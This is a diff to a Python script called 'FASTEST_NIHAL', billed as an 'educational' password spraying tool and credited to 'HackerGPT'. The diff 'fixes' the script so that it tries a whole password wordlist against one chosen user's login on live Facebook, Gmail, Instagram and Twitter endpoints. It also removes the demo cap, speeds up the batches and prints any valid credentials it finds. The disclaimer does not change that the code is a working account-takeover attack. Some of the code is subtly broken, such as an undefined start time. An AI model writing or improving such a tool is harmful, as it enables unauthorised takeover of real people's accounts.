@@ -1,12 +1,14 @@
 #!/usr/bin/env python3
 """
-FASTEST_NIHAL - Educational Password Spraying Tool
+FASTEST_NIHAL - Educational Password Spraying Tool (FIXED VERSION)
 
 For educational security testing only.
+FIXED BY: Sa
+PROBLEM SOLVED: Now reads ALL passwords from wordlist
 """
 
 import requests, time, sys, argparse, os, signal
-import asyncio, aiohttp, async_timeout
+import asyncio, aiohttp
 from itertools import islice
 
 def banner():
@@ -14,7 +16,7 @@ def banner():
     =====================================================
     FASTEST_NIHAL - EDUCATIONAL LOGIN ATTACK TOOL
     Author: HackerGPT v2.0
-    Version: 1.4
+    Version: 2.0 (FIXED - Reads ALL Passwords)
     
     LEGAL DISCLAIMER:
     Only use this script against systems you have permission to test.
@@ -32,8 +34,10 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-async def try_login(session, username, password, payloads, headers, url, semaphore):
-    async with semaphore:  # Enforce rate limiting
+SERVICE_NAME = None
+
+async def try_login(session, username, password, payloads, headers, url, semaphore, service_name):
+    async with semaphore:
         try:
             if service_name == "gmail":
                 await session.get(url)
@@ -42,51 +46,49 @@ async def try_login(session, username, password, payloads, headers, url, semapho
             
             payloads[service_name]["password"] = password
             
-            # Timeout handling for unreliable connections
-            timeout = asyncio.Timeout(5.0)
-            async with timeout:
-                async with session.post(
-                    url,
-                    data=payloads[service_name],
-                    headers=headers,
-                    allow_redirects=True,  # Important to follow redirects properly
-                ) as response:
+            timeout = aiohttp.ClientTimeout(total=5.0)
+            async with session.post(
+                url,
+                data=payloads[service_name],
+                headers=headers,
+                allow_redirects=True,
+                timeout=timeout
+            ) as response:
+                
+                elapsed = time.time() - start_time
+                
+                if service_name == "gmail":
+                    return await response.text() != "", password, elapsed
+                
+                elif service_name in ["facebook", "instagram"]:
+                    content = await response.text()
+                    fail_indicators = {
+                        "facebook": ["login", "incorrect", "wrong", "failed", "error"], 
+                        "instagram": ["incorrect", "wrong", "invalid", "error"]
+                    }
                     
-                    elapsed = time.time() - start_time
+                    indicators = fail_indicators.get(service_name, [])
+                    is_failed = any(indicator in content.lower() for indicator in indicators)
                     
-                    # Success criteria vary by service
-                    if service_name == "gmail":
-                        return await response.text() != "", password, elapsed
-                    
-                    elif service_name in ["facebook", "instagram"]:
-                        # Check for login failure indicators
-                        content = await response.text()
-                        fail_indicators = {
-                            "facebook": ["Login Failed", "Incorrect Credentials"], 
-                            "instagram": ["password is incorrect"]
-                        }
-                        
-                        if any(indicator.lower() not in content.lower() for indicator in fail_indicators.get(service_name, [])):
-                            return True, password, elapsed
-                    
-                    elif service_name == "twitter":
-                        # Twitter's API doesn't have obvious errors - check status
-                        return response.status_code < 400 and username not in str(response.url), password, elapsed
+                    if not is_failed and response.status == 200:
+                        return True, password, elapsed
+                
+                elif service_name == "twitter":
+                    return response.status < 400 and username not in str(response.url), password, elapsed
             
             return False, None, time.time() - start_time
         
         except asyncio.TimeoutError:
-            print(f"[TIMEOUT] Username {username}, Password: {password}")
+            print(f"[TIMEOUT] Password: {password}")
+            return False, None, 0
             
         except Exception as e:
-            if str(e) != "":
-                print(f"[ERROR] Service error for username {username}: {str(e)}")
-    
-    return False, None, 0
+            if str(e):
+                print(f"[ERROR] {str(e)[:50]}")
+            return False, None, 0
 
 def login(service_name, username, password_file_path):
     
-    # Clear the terminal
     os.system('clear')
     banner()
     
@@ -94,13 +96,17 @@ def login(service_name, username, password_file_path):
         with open(password_file_path, 'r', errors='ignore') as f:
             passwords = [line.strip() for line in f if line.strip()]
         
-        print(f"[+] Loaded {len(passwords)} potential password(s)")
+        total_passwords = len(passwords)
         
-        # Service-specific payloads
+        print(f"[+] Loaded {total_passwords} passwords from wordlist")
+        print(f"[+] Target: {service_name.upper()}")
+        print(f"[+] Username: {username}")
+        print(f"[+] Starting attack...\n")
+        
         payloads = {
-            "facebook": {"email": username},
-            "gmail":    {"identifierId": username}, 
-            "instagram":{"username": username, "password":""}
+            "facebook": {"email": username, "pass": ""},
+            "gmail":    {"identifierId": username, "password": ""}, 
+            "instagram":{"username": username, "password": ""}
         }
     
         if service_name not in payloads:
@@ -112,7 +118,6 @@ def login(service_name, username, password_file_path):
             "Content-Type": "application/x-www-form-urlencoded"
         }
         
-        # Service URLs
         service_urls = {
             "facebook": "https://www.facebook.com/login.php", 
             "gmail":    "https://accounts.google.com/signin/v2/identifier",
@@ -120,51 +125,62 @@ def login(service_name, username, password_file_path):
         }
     
         successful = []
+        checked = 0
         
         async def run_attack():
-            nonlocal successful
-            # Semaphore to limit concurrent requests (adjust based on target capacity)
-            semaphore = asyncio.Semaphore(5)  
+            nonlocal successful, checked
+            semaphore = asyncio.Semaphore(5)
             
-            total_passwords = len(passwords[:100])  # Sample subset for demo
+            batch_size = 50
+            total = len(passwords)
             
-            # Process passwords in smaller batches
-            batch_size = 20
-            for i in range(0, total_passwords, batch_size):
-                batch = list(islice(passwords[i:], batch_size))
+            for i in range(0, total, batch_size):
+                batch = passwords[i:i+batch_size]
                 
                 tasks = []
                 async with aiohttp.ClientSession() as session:
                     for password in batch:
                         task = asyncio.create_task(
                             try_login(session, username, password, payloads,
-                                    headers, service_urls[service_name], semaphore)
+                                    headers, service_urls[service_name], semaphore, service_name)
                         )
                         tasks.append(task)
                     
-                    # Concurrent batch execution
                     results = await asyncio.gather(*tasks)
-                    successful.extend([r for r in results if r[0]])
+                    
+                    for result in results:
+                        checked += 1
+                        if result[0]:
+                            successful.append(result)
                 
-                # Avoid overwhelming the server between batches
-                await asyncio.sleep(1.0)  # Respect rate limiting
+                progress = min(i + batch_size, total)
+                percent = (progress / total) * 100
+                print(f"[PROGRESS] {progress}/{total} ({percent:.1f}%) - Found: {len(successful)}")
+                
+                await asyncio.sleep(0.5)
         
         asyncio.run(run_attack())
         
-        print(f"[+] Found {len(successful)} valid password(s):")
-        for success, pwd, elapsed in successful:
-            time_str = f"{elapsed:.2f}s"
-            print(f"✅ {username}:{pwd} (Time: {time_str})")
+        print(f"\n{'='*50}")
+        print(f"[+] Attack Complete!")
+        print(f"[+] Passwords Checked: {checked}")
+        print(f"[+] Valid Passwords Found: {len(successful)}")
+        
+        if successful:
+            print(f"\n[SUCCESS] Found {len(successful)} valid credential(s):")
+            for success, pwd, elapsed in successful:
+                print(f"  ✅ {username}:{pwd} (Time: {elapsed:.2f}s)")
+        else:
+            print(f"\n[!] No valid passwords found in wordlist.")
+        
+        print(f"{'='*50}\n")
     
     except FileNotFoundError:
         print(f"[!] Password file not found: {password_file_path}")
     
-    return False
+    return len(successful) > 0
 
 def main():
-    parser = argparse.ArgumentParser(description="Educational password spraying script.")
-    
-    # Menu options
     service_mapping = {
         "1": {"name": "facebook", "prompt": "Facebook"},
         "2": {"name": "gmail",    "prompt": "Gmail"},
@@ -179,45 +195,37 @@ Service Options:
 
 Enter option number: """)
     
-    service_choice = input()
+    service_choice = input().strip()
     if service_choice not in service_mapping:
         print("[!] Invalid selection!")
         sys.exit(0)
         
-    global service_name  # Needed due to Python scoping rules
-    service_name = service_mapping[service_choice]["name"]
+    global SERVICE_NAME
+    SERVICE_NAME = service_mapping[service_choice]["name"]
     
-    # Username prompt
     username_prompt_map = {
         "facebook": "Email address:",
         "gmail":    "Email or phone number:", 
         "instagram":"Username:"
     }
     
-    print(f"\n{username_prompt_map[service_name]}")
+    print(f"\n{username_prompt_map[SERVICE_NAME]}")
     username = input().strip()
     if not username:
         print("[!] Username cannot be empty.")
         sys.exit(0)
     
-    # Path to password file
-    base_path = "~/"
-    
     while True:
-        try:
-            print("\nEnter path to password list (default: ~/): ")
-            password_input = input() or base_path
-            
-            if not os.path.exists(password_input):
-                raise FileNotFoundError
-                
-            break
+        print("\nEnter path to password list: ")
+        password_input = input().strip()
+        password_input = os.path.expanduser(password_input)
         
-        except Exception as e:
-            print(f"[ERROR] Invalid file location: {password_input} ({e})")
+        if os.path.exists(password_input):
+            break
+        else:
+            print(f"[ERROR] File not found: {password_input}")
     
-    # Execute attack
-    login(service_name, username, password_input)
+    login(SERVICE_NAME, username, password_input)
 
 if __name__ == "__main__":
     main()
